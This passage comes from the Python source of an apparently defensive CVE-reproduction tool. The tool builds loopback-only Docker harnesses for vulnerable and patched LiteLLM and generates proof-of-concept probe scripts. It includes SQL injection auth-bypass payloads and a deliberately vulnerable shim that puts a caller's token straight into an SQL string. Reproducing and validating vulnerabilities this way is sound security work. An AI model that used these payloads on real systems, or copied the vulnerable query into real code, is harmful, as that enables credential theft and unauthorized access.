) -> dict[str, object]:
    target_urls = {
        "vulnerable": f"http://127.0.0.1:{base_port}",
        "patched": f"http://127.0.0.1:{base_port + 1}",
        "shim_vulnerable": f"http://127.0.0.1:{base_port + 10}",
        "shim_patched": f"http://127.0.0.1:{base_port + 11}",
    }
    class_specific = _class_specific_investigation(finding.vulnerability_class)
    return {
        "schema_version": 1,
        "cve_id": cve.cve_id,
        "vulnerability_class": finding.vulnerability_class,
        "target_urls": target_urls,
        "hypothesis": finding.defensive_hypothesis,
        "patch_signal": finding.relevant_patch_signal,
        "changed_files": finding.changed_files,
        "harness": {
            "runtime": harness.runtime,
            "isolation": harness.isolation,
            "dockerfiles": harness.dockerfiles,
            "helper_scripts": harness.helper_scripts,
        },
        "investigation_questions": [
            "Which request path reaches the patched code path inside the local harness?",
            "What seed data is required before the vulnerable path can produce an observable differential?",
            "What negative controls prove that a 2xx response is not from an unauthenticated health or public route?",
            "Does the upstream vulnerable container trigger, or only the deterministic shim?",
            "Does the patched container block the same input while preserving normal expected behavior?",
        ],
        "probe_matrix": class_specific["probe_matrix"],
        "success_criteria": [
            "The vulnerable upstream target records triggered=true with an auth- or vulnerability-shaped response.",
            "The patched upstream target records triggered=false for the same probe.",
            "The run preserves raw request/response prefixes in exploiter/outcome.json.",
            "A shim-only differential is useful but must not be scored as a full upstream exploit proof.",
        ],
        "controls": class_specific["controls"],
        "expected_blockers": class_specific["expected_blockers"],
        "next_experiments_if_no_upstream_trigger": class_specific["next_experiments"],
    }


def _class_specific_investigation(vulnerability_class: str) -> dict[str, list[dict[str, str]] | list[str]]:
    if vulnerability_class == "sql injection":
        return {
            "probe_matrix": [
                {
                    "step": "seed",
                    "method": "Create a harness-only LiteLLM virtual key using the local master key so the auth lookup has database state to query.",
                    "expected_signal": "Both upstream containers return 200 from /key/generate with no external provider call.",
                },
                {
                    "step": "format-gate control",
                    "method": "Use sk-prefixed injected Authorization values so the request passes LiteLLM's virtual-key prefix check.",
                    "expected_signal": "Failures after this point are token lookup failures, not prefix-format rejections.",
                },
                {
                    "step": "upstream vulnerable probe",
                    "method": "Probe /key/info and /v1/models on the vulnerable target with the same sk-prefixed SQLi candidates.",
                    "expected_signal": "A vulnerable trigger requires a 2xx response containing auth-shaped fields such as keys, models, user_id, team_id, or key_name.",
                },
                {
                    "step": "upstream patched probe",
                    "method": "Repeat the identical probes against the patched target.",
                    "expected_signal": "The patched target should reject the injected token or avoid returning auth-shaped data.",
                },
                {
                    "step": "shim differential",
                    "method": "Run the same class of payloads against /verify on shim vulnerable and patched services.",
                    "expected_signal": "Shim vulnerable returns auth-shaped data; shim patched rejects the payload.",
                },
            ],
            "controls": [
                "All targets are fixed loopback URLs generated from --base-port.",
                "The PoC records response prefixes only; it does not exfiltrate credentials.",
                "A 2xx from a public endpoint is ignored unless auth-shaped body markers are present.",
                "The shim result is separated from upstream vulnerable/patched outcomes.",
            ],
            "expected_blockers": [
                "LiteLLM may hash the supplied virtual key before database lookup, causing injected raw tokens to miss the vulnerable SQL construction path.",
                "The public advisory may require a different endpoint, config flag, or database state than the current harness seeds.",
                "The patched release span may include many unrelated changes, so source-diff patch validation can succeed even while the PoC path remains unproven upstream.",
            ],
            "next_experiments": [
                "Trace LiteLLM 1.81.16 auth flow from Authorization header to database query and identify the exact function that builds SQL from user-controlled input.",
                "Add a harness-only request path or config that reaches that function without bypassing normal app startup.",
                "Seed database rows matching the transformed token/hash format used by the vulnerable lookup.",
                "Record a negative control with a normal invalid sk-token and a positive control with a generated valid key.",
            ],
        }
    return {
        "probe_matrix": [
            {
                "step": "surface mapping",
                "method": "Map generated harness endpoints to the changed files and patch signal.",
                "expected_signal": "A local request path reaches code adjacent to the patch signal.",
            },
            {
                "step": "vulnerable/patched differential",
                "method": "Run the same localhost-only probe against vulnerable and patched targets.",
                "expected_signal": "Vulnerable target exhibits the class-specific behavior; patched target blocks it.",
            },
        ],
        "controls": [
            "Use only loopback targets.",
            "Keep vulnerable and patched probes byte-for-byte comparable.",
            "Preserve raw outcome artifacts for review.",
        ],
        "expected_blockers": [
            "The package may not expose a runnable service surface with the generated harness yet.",
            "Additional seed data or configuration may be required to reach the affected code path.",
        ],
        "next_experiments": [
            "Map changed files to public entrypoints.",
            "Add harness seed data and controls for the affected path.",
        ],
    }


def _poc_investigation_markdown(payload: dict[str, object]) -> str:
    def bullet(items):
        return "\n".join(f"- {item}" for item in items)

    lines = [
        f"# PoC Investigation: {payload['cve_id']}",
        "",
        f"- Vulnerability class: {payload['vulnerability_class']}",
        f"- Hypothesis: {payload['hypothesis']}",
        f"- Patch signal: {payload['patch_signal']}",
        "",
        "## Target URLs",
        "",
    ]
    for name, url in dict(payload["target_urls"]).items():
        lines.append(f"- {name}: {url}")
    lines.extend(["", "## Investigation Questions", "", bullet(payload["investigation_questions"]), "", "## Probe Matrix", ""])
    for item in payload["probe_matrix"]:
        lines.extend([
            f"### {item['step']}",
            "",
            f"- Method: {item['method']}",
            f"- Expected signal: {item['expected_signal']}",
            "",
        ])
    lines.extend([
        "## Success Criteria",
        "",
        bullet(payload["success_criteria"]),
        "",
        "## Controls",
        "",
        bullet(payload["controls"]),
        "",
        "## Expected Blockers",
        "",
        bullet(payload["expected_blockers"]),
        "",
        "## Next Experiments If No Upstream Trigger",
        "",
        bullet(payload["next_experiments_if_no_upstream_trigger"]),
        "",
    ])
    if payload.get("changed_files"):
        lines.extend(["## Changed Files Considered", ""])
        lines.extend(f"- `{path}`" for path in payload["changed_files"])
        lines.append("")
    return "\n".join(lines)


def _docker_available() -> bool:
    if shutil.which("docker") is None:
        return False
    try:
        completed = subprocess.run(
            ["docker", "version", "--format", "{{.Server.Version}}"],
            capture_output=True,
            text=True,
            timeout=10,
            check=False,
        )
    except (OSError, subprocess.TimeoutExpired):
        return False
    return completed.returncode == 0 and completed.stdout.strip() != ""


def _http_probe(
    url: str,
    *,
    headers: dict[str, str] | None = None,
    method: str = "GET",
    body: str | None = None,
    timeout: float = 5.0,
) -> tuple[int | None, str]:
    """Probe a localhost harness endpoint. Returns (status, body).

    Returns (None, error_message) on connection failure so callers can
    distinguish "target answered" from "nothing listening" — which is
    exactly the distinction the provisioning gate depends on.
    """
    try:
        request = Request(
            url,
            data=(None if body is None else body.encode("utf-8")),
            headers=headers or {},
            method=method,
        )
        with urlopen(request, timeout=timeout) as response:
            return response.status, response.read(2048).decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read(2048).decode("utf-8", errors="replace")
    except Exception as exc:
        return None, f"{type(exc).__name__}: {exc}"


def _parse_poc_outcome(payload: dict) -> list[ExploitOutcome]:
    outcomes: list[ExploitOutcome] = []
    for variant in ("vulnerable", "patched", "shim_vulnerable", "shim_patched"):
        record = payload.get(variant)
        if not isinstance(record, dict):
            continue
        triggered = bool(record.get("triggered"))
        detail = str(record.get("detail") or record.get("error") or "")
        outcomes.append(
            ExploitOutcome(variant=variant, triggered=triggered, detail=detail)
        )
    return outcomes


def _parse_version_spec(spec: str) -> tuple[str, str] | None:
    cleaned = spec.strip()
    if not cleaned:
        return None
    if " " in cleaned:
        package, version = cleaned.rsplit(" ", 1)
        if package and version:
            return package, version
    if cleaned.count("@") >= 1 and not cleaned.endswith("@"):
        package, version = cleaned.rsplit("@", 1)
        if package and version:
            return package, version
    return None


def _read_lines(path: Path) -> list[str]:
    if not path.exists():
        return []
    # Normalize text line endings for source diffs. Some package archives mix
    # CRLF/LF across releases; CVEHunt cares whether the patched content is
    # semantically reproduced, not whether archive line endings match exactly.
    text = path.read_text(encoding="utf-8", errors="replace")
    return [line + "\n" for line in text.splitlines()]


def _detect_patch_signal(diff_text: str) -> str | None:
    for marker in (
        "Object.prototype.hasOwnProperty",
        "hasOwnProperty.call",
        "Object.hasOwn",
        "ownProperty",
        "allowlist",
        "lookup",
        "execute_query",
        "bindparam",
        "text(",
        "%s",
        "?",
        "parametri",
        "sanitize",
        "escape",
        "prisma",
        "sqlalchemy",
    ):
        if marker in diff_text:
            return marker
    return None


def _files_equivalent(left: Path, right: Path) -> bool:
    try:
        return left.read_text(encoding="utf-8").splitlines() == right.read_text(encoding="utf-8").splitlines()
    except UnicodeDecodeError:
        return _sha256(left) == _sha256(right)


def _sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(65536), b""):
            digest.update(chunk)
    return digest.hexdigest()


def _relpath(path: Path, root: Path) -> str:
    return path.relative_to(root).as_posix()


def _remove_tree(path: Path) -> None:
    for child in sorted(path.rglob("*"), reverse=True):
        if child.is_file() or child.is_symlink():
            child.unlink()
        else:
            child.rmdir()
    path.rmdir()


def _dockerfile_for_source(
    *,
    ecosystem: str,
    variant: str,
    source_root: str | None,
    package: str | None,
    version: str | None,
) -> str:
    if ecosystem == "pypi":
        return _python_dockerfile(
            variant=variant,
            package=package,
            version=version,
        )
    return _node_dockerfile(
        variant=variant,
        source_root=source_root,
        package=package,
        version=version,
    )


def _node_dockerfile(
    *,
    variant: str,
    source_root: str | None,
    package: str | None,
    version: str | None,
) -> str:
    source_path = source_root or "sources/package"
    display_package = package or "unknown-package"
    display_version = version or "unknown-version"
    return "\n".join(
        [
            "FROM node:22-bullseye-slim",
            "WORKDIR /workspace",
            f"COPY {source_path} /workspace/package",
            "WORKDIR /workspace/package",
            "RUN npm install --ignore-scripts --include=dev",
            (
                'CMD ["node", "-e", '
                f'"console.log(\\"{variant} harness ready for {display_package} {display_version}\\")"'
                "]"
            ),
            "",
        ]
    )


def _python_dockerfile(
    *,
    variant: str,
    package: str | None,
    version: str | None,
) -> str:
    display_package = package or "unknown-package"
    display_version = version or "unknown-version"
    pip_extras = ""
    extra_packages: list[str] = []
    if display_package == "litellm":
        pip_extras = "[proxy]"
        # The published litellm[proxy] wheel does not actually pull `prisma`,
        # but proxy_server.py imports it eagerly during DB setup. Pin to the
        # version litellm declares in its source pyproject.
        extra_packages.append("prisma==0.11.0")
    install_target = f"{display_package}{pip_extras}=={display_version}"
    install_args = " ".join(
        f'"{spec}"' for spec in [install_target, *extra_packages]
    )
    runtime_message = f"{variant} harness ready for {display_package} {display_version}"
    apt_packages = ["curl"]
    if display_package == "litellm":
        # prisma-client-py shells out to npm to install its JS CLI. The
        # bundled-node bootstrap fails on python:3.11-slim, so install
        # debian's nodejs/npm and let prisma reuse the global runtime.
        apt_packages.extend(["nodejs", "npm", "ca-certificates", "openssl"])
    lines = [
        "FROM python:3.11-slim",
        "ENV PYTHONUNBUFFERED=1",
        "ENV PIP_DISABLE_PIP_VERSION_CHECK=1",
        "WORKDIR /workspace",
        "RUN apt-get update "
        "&& apt-get install -y --no-install-recommends "
        + " ".join(apt_packages)
        + " && rm -rf /var/lib/apt/lists/*",
        f"RUN pip install --no-cache-dir {install_args}",
    ]
    if display_package == "litellm":
        # Generate the prisma client against the schema bundled inside the
        # installed litellm wheel. Without this step the proxy aborts at
        # startup with "Unable to find Prisma binaries". Engine binaries
        # are downloaded once at image build time.
        lines.append("ENV PRISMA_USE_GLOBAL_NODE=true")
        lines.append(
            "RUN prisma generate "
            "--schema=/usr/local/lib/python3.11/site-packages/litellm/proxy/schema.prisma"
        )
    lines.extend(
        [
            "EXPOSE 4000",
            (
                'CMD ["python", "-c", '
                f'"print(\'{runtime_message}\'); '
                "import time; time.sleep(2 ** 31)"
                '"]'
            ),
            "",
        ]
    )
    return "\n".join(lines)


def _compose_for_harness(
    *,
    cve_id: str,
    package: str,
    ecosystem: str,
    include_shim: bool = False,
    base_port: int = 4000,
) -> str:
    slug = cve_id.lower().replace("-", "_")
    package_slug = package.replace("/", "-")
    image_vuln = f"cvehunt/{slug}-{package_slug}:vulnerable"
    image_patched = f"cvehunt/{slug}-{package_slug}:patched"
    image_shim_vuln = f"cvehunt/{slug}-{package_slug}-shim:vulnerable"
    image_shim_patched = f"cvehunt/{slug}-{package_slug}-shim:patched"
    if ecosystem == "pypi" and package == "litellm":
        body = _litellm_compose(
            image_vuln=image_vuln, image_patched=image_patched, base_port=base_port
        )
    else:
        body = "\n".join(
            [
                'version: "3.9"',
                "services:",
                "  vulnerable:",
                f"    image: {image_vuln}",
                "    build:",
                "      context: ..",
                "      dockerfile: harness/Dockerfile.vulnerable",
                "    ports:",
                f'      - "127.0.0.1:{base_port}:4000"',
                "  patched:",
                f"    image: {image_patched}",
                "    build:",
                "      context: ..",
                "      dockerfile: harness/Dockerfile.patched",
                "    ports:",
                f'      - "127.0.0.1:{base_port + 1}:4000"',
                "",
            ]
        )
    if not include_shim:
        return body
    shim_block = "\n".join(
        [
            "  shim-vulnerable:",
            f"    image: {image_shim_vuln}",
            "    build:",
            "      context: shim/vulnerable",
            "      dockerfile: Dockerfile",
            "    ports:",
            f'      - "127.0.0.1:{base_port + 10}:8000"',
            "  shim-patched:",
            f"    image: {image_shim_patched}",
            "    build:",
            "      context: shim/patched",
            "      dockerfile: Dockerfile",
            "    ports:",
            f'      - "127.0.0.1:{base_port + 11}:8000"',
            "",
        ]
    )
    return body.rstrip("\n") + "\n" + shim_block


def _litellm_compose(*, image_vuln: str, image_patched: str, base_port: int = 4000) -> str:
    command = (
        '["litellm", "--host", "0.0.0.0", "--port", "4000", '
        '"--config", "/workspace/config.yaml"]'
    )
    return "\n".join(
        [
            'version: "3.9"',
            "services:",
            "  db:",
            "    image: postgres:16-alpine",
            "    environment:",
            "      POSTGRES_USER: litellm",
            "      POSTGRES_PASSWORD: litellm",
            "      POSTGRES_DB: litellm",
            "    healthcheck:",
            '      test: ["CMD-SHELL", "pg_isready -U litellm -d litellm"]',
            "      interval: 3s",
            "      timeout: 3s",
            "      retries: 30",
            "    volumes:",
            "      - ./db-init.sql:/docker-entrypoint-initdb.d/01-init.sql:ro",
            "  vulnerable:",
            f"    image: {image_vuln}",
            "    build:",
            "      context: ..",
            "      dockerfile: harness/Dockerfile.vulnerable",
            "    depends_on:",
            "      db:",
            "        condition: service_healthy",
            "    environment:",
            "      DATABASE_URL: postgresql://litellm:litellm@db:5432/litellm_vuln",
            "      LITELLM_MASTER_KEY: sk-harness-master",
            '      STORE_MODEL_IN_DB: "True"',
            "    volumes:",
            "      - ./config.yaml:/workspace/config.yaml:ro",
            "    ports:",
            f'      - "127.0.0.1:{base_port}:4000"',
            f"    command: {command}",
            "  patched:",
            f"    image: {image_patched}",
            "    build:",
            "      context: ..",
            "      dockerfile: harness/Dockerfile.patched",
            "    depends_on:",
            "      db:",
            "        condition: service_healthy",
            "    environment:",
            "      DATABASE_URL: postgresql://litellm:litellm@db:5432/litellm_patched",
            "      LITELLM_MASTER_KEY: sk-harness-master",
            '      STORE_MODEL_IN_DB: "True"',
            "    volumes:",
            "      - ./config.yaml:/workspace/config.yaml:ro",
            "    ports:",
            f'      - "127.0.0.1:{base_port + 1}:4000"',
            f"    command: {command}",
            "",
        ]
    )


def _litellm_config_yaml() -> str:
    return "\n".join(
        [
            "# Harness-only LiteLLM proxy config.",
            "# A dummy model_list keeps the proxy bootable without external API",
            "# credentials. The proxy never reaches the upstream provider during",
            "# the harness PoC because the SQLi probe targets the auth path.",
            "model_list:",
            "  - model_name: harness-stub",
            "    litellm_params:",
            "      model: openai/harness-stub",
            "      api_base: http://127.0.0.1:9/disabled",
            '      api_key: "harness-only-not-a-real-key"',
            "general_settings:",
            "  master_key: sk-harness-master",
            "  database_url: os.environ/DATABASE_URL",
            "",
        ]
    )


SHIM_SUPPORTED_CLASSES = ("sql injection",)


def _shim_supported(vulnerability_class: str) -> bool:
    return vulnerability_class in SHIM_SUPPORTED_CLASSES


def _shim_app_source(vulnerability_class: str, *, variant: str) -> str:
    """Source for the harness shim demonstrating the vulnerability class.

    The shim is harness-only: it listens on 0.0.0.0:8000 inside the container
    (the compose stack publishes it on 127.0.0.1:4010/4011), seeds a single
    fake credential into a sqlite database at startup, and exposes a /verify
    endpoint that the SafetyPolicy-vetted PoC probes. It exists to make the
    Validator/Judge cycle observable when the upstream package does not
    surface the vulnerability class through any public endpoint we can hit.
    """
    if vulnerability_class != "sql injection":
        raise ValueError(f"no shim available for class: {vulnerability_class}")
    if variant == "vulnerable":
        verify_body = (
            "    # Vulnerable on purpose: caller-controlled token interpolated\n"
            "    # straight into the SQL string. This is the demo surface; the\n"
            "    # corresponding patched shim parameterizes the same query.\n"
            "    cursor = conn.cursor()\n"
            "    cursor.execute(\n"
            "        f\"SELECT key_alias, user_id FROM api_keys WHERE token = '{token}' LIMIT 1\"\n"
            "    )\n"
        )
    elif variant == "patched":
        verify_body = (
            "    # Patched: parameterized query rejects injection attempts\n"
            "    # cleanly while accepting well-formed sk- tokens.\n"
            "    cursor = conn.cursor()\n"
            "    cursor.execute(\n"
            "        \"SELECT key_alias, user_id FROM api_keys WHERE token = ? LIMIT 1\",\n"
            "        (token,),\n"
            "    )\n"
        )
    else:
        raise ValueError(f"unknown shim variant: {variant}")
    return (
        "\"\"\"Harness-only shim demonstrating a SQL injection class boundary.\n"
        "\n"
        "This service is NOT a real authentication system. It exists only to\n"
        "make the CVEHunt pipeline's Validator/Judge cycle observable when the\n"
        "upstream package under test does not surface the vulnerability class\n"
        "through a directly probeable endpoint. It listens inside the harness\n"
        "compose network and is published on 127.0.0.1 only.\n"
        "\"\"\"\n"
        "from __future__ import annotations\n"
        "\n"
        "import sqlite3\n"
        "from contextlib import asynccontextmanager\n"
        "\n"
        "from fastapi import FastAPI, Header, HTTPException\n"
        "\n"
        "DB_PATH = \"/tmp/shim.db\"\n"
        "\n"
        "\n"
        "def _seed_database() -> None:\n"
        "    conn = sqlite3.connect(DB_PATH)\n"
        "    cursor = conn.cursor()\n"
        "    cursor.execute(\n"
        "        \"CREATE TABLE IF NOT EXISTS api_keys (\"\n"
        "        \" token TEXT PRIMARY KEY,\"\n"
        "        \" key_alias TEXT,\"\n"
        "        \" user_id TEXT)\"\n"
        "    )\n"
        "    cursor.execute(\"DELETE FROM api_keys\")\n"
        "    cursor.execute(\n"
        "        \"INSERT INTO api_keys (token, key_alias, user_id) VALUES (?, ?, ?)\",\n"
        "        (\"sk-harness-demo-only\", \"harness-demo\", \"harness-user-1\"),\n"
        "    )\n"
        "    conn.commit()\n"
        "    conn.close()\n"
        "\n"
        "\n"
        "@asynccontextmanager\n"
        "async def lifespan(app: FastAPI):\n"
        "    _seed_database()\n"
        "    yield\n"
        "\n"
        "\n"
        "app = FastAPI(lifespan=lifespan)\n"
        "\n"
        "\n"
        "@app.get(\"/health/readiness\")\n"
        "def readiness() -> dict:\n"
        "    return {\"status\": \"ok\"}\n"
        "\n"
        "\n"
        "@app.get(\"/verify\")\n"
        "def verify(authorization: str | None = Header(default=None)) -> dict:\n"
        "    if not authorization or not authorization.lower().startswith(\"bearer \"):\n"
        "        raise HTTPException(status_code=401, detail=\"missing bearer token\")\n"
        "    token = authorization.split(\" \", 1)[1]\n"
        "    conn = sqlite3.connect(DB_PATH)\n"
        f"{verify_body}"
        "    row = cursor.fetchone()\n"
        "    conn.close()\n"
        "    if row is None:\n"
        "        raise HTTPException(status_code=401, detail=\"invalid token\")\n"
        "    return {\"keys\": [{\"key_alias\": row[0], \"user_id\": row[1]}]}\n"
    )


def _shim_dockerfile() -> str:
    return "\n".join(
        [
            "FROM python:3.11-slim",
            "ENV PYTHONUNBUFFERED=1",
            "ENV PIP_DISABLE_PIP_VERSION_CHECK=1",
            "WORKDIR /workspace",
            "RUN pip install --no-cache-dir \"fastapi==0.115.0\" \"uvicorn==0.30.6\"",
            "COPY app.py /workspace/app.py",
            "EXPOSE 8000",
            'CMD ["uvicorn", "app:app", "--host", "0.0.0.0", "--port", "8000"]',
            "",
        ]
    )


def _shim_readme(vulnerability_class: str) -> str:
    return (
        f"# Harness Shim ({vulnerability_class})\n\n"
        "This directory contains a deliberately-vulnerable mini-service paired\n"
        "with its sanitized counterpart. Each variant runs in its own\n"
        "container, listens on 0.0.0.0:8000 inside the compose network, and\n"
        "is published on 127.0.0.1 only (4010 vulnerable, 4011 patched).\n\n"
        "The shim is harness-only. It seeds a single synthetic credential\n"
        "into an in-container sqlite database and exposes `/verify` so the\n"
        "PoC can demonstrate the vulnerability class deterministically. It\n"
        "is NOT used for any real authentication, has no production data,\n"
        "and is never reachable outside the local docker-compose network.\n"
    )


def _litellm_db_init_sql() -> str:
    return "\n".join(
        [
            "-- Per-variant databases keep prisma migrations from each release",
            "-- isolated. Both databases live in the same harness postgres",
            "-- container; neither is reachable outside the compose network.",
            "CREATE DATABASE litellm_vuln;",
            "CREATE DATABASE litellm_patched;",
            "",
        ]
    )


def _build_script_for_images(*, cve_id: str, package: str) -> str:
    slug = cve_id.lower().replace("-", "_")
    package_slug = package.replace("/", "-")
    return "\n".join(
        [
            "#!/usr/bin/env bash",
            "set -euo pipefail",
            f'docker build -f harness/Dockerfile.vulnerable -t "cvehunt/{slug}-{package_slug}:vulnerable" .',
            f'docker build -f harness/Dockerfile.patched -t "cvehunt/{slug}-{package_slug}:patched" .',
            "",
        ]
    )


def _harness_readme(
    *,
    cve: CveRecord,
    finding: ResearchFinding,
    sources: SourceBundle,
) -> str:
    lines = [
        f"# Harness: {cve.cve_id}",
        "",
        f"Package: {sources.package}",
        f"Vulnerable version: {sources.vulnerable_version}",
        f"Patched version: {sources.patched_version}",
        "",
        "This harness builds isolated vulnerable and patched containers and binds",
        "their service ports to 127.0.0.1 only. The PoC runner targets 127.0.0.1",
        "exclusively and cannot be repointed without source changes.",
        "",
        "## Research Summary",
        "",
        f"- Class: {finding.vulnerability_class}",
        f"- Surface: {finding.impacted_surface}",
        f"- Patch signal: {finding.relevant_patch_signal}",
        "",
        "## Generated Files",
        "",
        "- `harness/Dockerfile.vulnerable`",
        "- `harness/Dockerfile.patched`",
        "- `harness/docker-compose.yml`",
        "- `harness/build-images.sh`",
        "- `research/source_diff.patch`",
        "",
    ]
    if finding.changed_files:
        lines.extend(
            [
                "## Highest-Churn Files",
                "",
                *[f"- `{path}`" for path in finding.changed_files],
                "",
            ]
        )
    return "\n".join(lines)


def _select_poc_template(vulnerability_class: str):
    return {
        "sql injection": _poc_template_sql_injection,
        "unsafe deserialization": _poc_template_unsafe_deserialization,
        "unsafe interpolation": _poc_template_unsafe_interpolation,
    }.get(vulnerability_class)


def _poc_template_sql_injection(cve: CveRecord, base_port: int = 4000) -> str:
    return '''"""Harness-bound PoC for {cve_id} ({cve_name}).

This script targets ONLY the local CVEHunt harness containers via 127.0.0.1.
It exists to prove that the vulnerable container responds to a SQL injection
probe in the API key verification path while the patched container does not.

The script does not connect to any external host, accept a configurable
target, or attempt credential exfiltration. The target hosts are hardcoded
to the harness loopback bindings.
"""
from __future__ import annotations

import json
import sys
import urllib.error
import urllib.request


VULNERABLE_BASE_URL = "http://127.0.0.1:{vulnerable_port}"
PATCHED_BASE_URL = "http://127.0.0.1:{patched_port}"
SHIM_VULNERABLE_BASE_URL = "http://127.0.0.1:{shim_vulnerable_port}"
SHIM_PATCHED_BASE_URL = "http://127.0.0.1:{shim_patched_port}"


PROBE_PAYLOADS = [
    "Bearer sk-' OR 1=1-- ",
    "Bearer sk-' UNION SELECT NULL-- ",
    "Bearer sk-x'\\'' OR ''=''",
]


PROBE_PATHS = [
    "/key/info",
    "/v1/models",
]


SHIM_PROBE_PATHS = [
    "/verify",
]


# Substrings that imply the SQLi caused the auth path to admit the caller
# as a real principal. Public/unauthenticated health endpoints don't expose
# these structures, so requiring one of them filters out trivial 200s.
AUTH_BYPASS_BODY_MARKERS = (
    '"keys"',
    '"data"',
    '"key_name"',
    '"models"',
    '"user_id"',
    '"team_id"',
    '"models":[',
)


def ensure_seed_key(base_url: str) -> dict:
    """Create one local harness virtual key so auth lookup has a row to query."""
    request = urllib.request.Request(
        f"{{base_url}}/key/generate",
        data=json.dumps({{"models": ["fake-openai-endpoint"], "duration": "1h"}}).encode("utf-8"),
        headers={{
            "Authorization": "Bearer sk-harness-master",
            "Content-Type": "application/json",
        }},
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            body = response.read(2048).decode("utf-8", errors="replace")
            return {{"status": response.status, "body_prefix": body[:256]}}
    except urllib.error.HTTPError as exc:
        body = exc.read(512).decode("utf-8", errors="replace")
        return {{"status": exc.code, "body_prefix": body[:256]}}
    except Exception as exc:
        return {{"status": None, "error": str(exc)}}


def probe(base_url: str, paths: list[str] | None = None) -> dict:
    """Send each payload against each probe path and return per-call signals.

    A SQL injection in the API key verification path generally manifests as a
    parameterless query echoing more data than the request principal should
    have access to, or as a server-side error tied to malformed SQL. We record
    the status code and a short response prefix so the validator can compare
    vulnerable vs. patched outcomes.
    """
    seed = ensure_seed_key(base_url) if paths is None else None
    results = []
    for path in (paths if paths is not None else PROBE_PATHS):
        for payload in PROBE_PAYLOADS:
            try:
                request = urllib.request.Request(
                    f"{{base_url}}{{path}}",
                    headers={{"Authorization": payload}},
                )
                with urllib.request.urlopen(request, timeout=5) as response:
                    body = response.read(2048).decode("utf-8", errors="replace")
                    results.append({{
                        "path": path,
                        "payload": payload,
                        "status": response.status,
                        "body_prefix": body[:256],
                    }})
            except urllib.error.HTTPError as exc:
                body = b""
                try:
                    body = exc.read(512)
                except Exception:
                    pass
                results.append({{
                    "path": path,
                    "payload": payload,
                    "status": exc.code,
                    "body_prefix": body[:256].decode("utf-8", errors="replace"),
                }})
            except Exception as exc:
                results.append({{
                    "path": path,
                    "payload": payload,
                    "status": None,
                    "error": str(exc),
                }})
    return {{"base_url": base_url, "seed": seed, "results": results}}


def summarize(record: dict) -> dict:
    triggered = False
    detail = "no auth-bypass response observed against probed paths"
    for entry in record["results"]:
        status = entry.get("status")
        body = entry.get("body_prefix", "") or ""
        if status is None or not (200 <= status < 300):
            continue
        if not any(marker in body for marker in AUTH_BYPASS_BODY_MARKERS):
            continue
        triggered = True
        detail = (
            f"{{entry['path']}} returned {{status}} with auth-shaped body "
            f"for payload {{entry['payload']!r}}"
        )
        break
    return {{
        "base_url": record["base_url"],
        "triggered": triggered,
        "detail": detail,
    }}


def _probe_or_skip(base_url: str, paths: list[str] | None = None) -> dict | None:
    try:
        return probe(base_url, paths=paths)
    except Exception as exc:  # noqa: BLE001
        return {{"base_url": base_url, "results": [], "error": str(exc)}}


def main() -> int:
    vulnerable = probe(VULNERABLE_BASE_URL)
    patched = probe(PATCHED_BASE_URL)
    shim_vulnerable = _probe_or_skip(SHIM_VULNERABLE_BASE_URL, paths=SHIM_PROBE_PATHS)
    shim_patched = _probe_or_skip(SHIM_PATCHED_BASE_URL, paths=SHIM_PROBE_PATHS)
    summary = {{
        "cve_id": "{cve_id}",
        "vulnerable": summarize(vulnerable),
        "patched": summarize(patched),
        "raw": {{"vulnerable": vulnerable, "patched": patched}},
    }}
    if shim_vulnerable is not None and shim_vulnerable.get("results"):
        summary["shim_vulnerable"] = summarize(shim_vulnerable)
        summary["raw"]["shim_vulnerable"] = shim_vulnerable
    if shim_patched is not None and shim_patched.get("results"):
        summary["shim_patched"] = summarize(shim_patched)
        summary["raw"]["shim_patched"] = shim_patched
    print(json.dumps(summary, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''.format(
        cve_id=cve.cve_id,
        cve_name=cve.name,
        vulnerable_port=base_port,
        patched_port=base_port + 1,
        shim_vulnerable_port=base_port + 10,
        shim_patched_port=base_port + 11,
    )


def _poc_template_unsafe_deserialization(cve: CveRecord, base_port: int = 4000) -> str:
    return '''"""Harness-bound PoC for {cve_id} ({cve_name}).

This script targets ONLY the local CVEHunt harness containers via 127.0.0.1.
It exists to demonstrate that the vulnerable container reaches a permissive
deserialization path while the patched container blocks it.
"""
from __future__ import annotations

import json
import sys
import urllib.error
import urllib.request


VULNERABLE_BASE_URL = "http://127.0.0.1:{vulnerable_port}"
PATCHED_BASE_URL = "http://127.0.0.1:{patched_port}"


PROBE_BODY = json.dumps([
    "$$ref",
    {{"id": "harness-canary", "value": "harness-only-marker"}},
]).encode("utf-8")


def probe(base_url: str) -> dict:
    request = urllib.request.Request(
        f"{{base_url}}/server-function",
        data=PROBE_BODY,
        headers={{"Content-Type": "application/json"}},
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            body = response.read(2048).decode("utf-8", errors="replace")
            return {{
                "base_url": base_url,
                "status": response.status,
                "body_prefix": body[:512],
            }}
    except urllib.error.HTTPError as exc:
        return {{
            "base_url": base_url,
            "status": exc.code,
            "body_prefix": exc.read(512).decode("utf-8", errors="replace"),
        }}
    except Exception as exc:
        return {{"base_url": base_url, "status": None, "error": str(exc)}}


def summarize(record: dict) -> dict:
    status = record.get("status")
    body = record.get("body_prefix", "") or ""
    if status is not None and 200 <= status < 300 and "harness-canary" in body:
        return {{
            "base_url": record["base_url"],
            "triggered": True,
            "detail": "deserialization echoed harness-canary marker",
        }}
    return {{
        "base_url": record["base_url"],
        "triggered": False,
        "detail": f"status={{status}} did not return canary marker",
    }}


def main() -> int:
    vulnerable = probe(VULNERABLE_BASE_URL)
    patched = probe(PATCHED_BASE_URL)
    summary = {{
        "cve_id": "{cve_id}",
        "vulnerable": summarize(vulnerable),
        "patched": summarize(patched),
        "raw": {{"vulnerable": vulnerable, "patched": patched}},
    }}
    print(json.dumps(summary, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''.format(
        cve_id=cve.cve_id,
        cve_name=cve.name,
        vulnerable_port=base_port,
        patched_port=base_port + 1,
    )


def _poc_template_unsafe_interpolation(cve: CveRecord, base_port: int = 4000) -> str:
    return '''"""Harness-bound PoC for {cve_id} ({cve_name}).

This script targets ONLY the local CVEHunt harness containers via 127.0.0.1.
It demonstrates that the vulnerable container resolves dangerous lookup
prefixes while the patched container rejects them.
"""
from __future__ import annotations

import json
import sys
import urllib.request


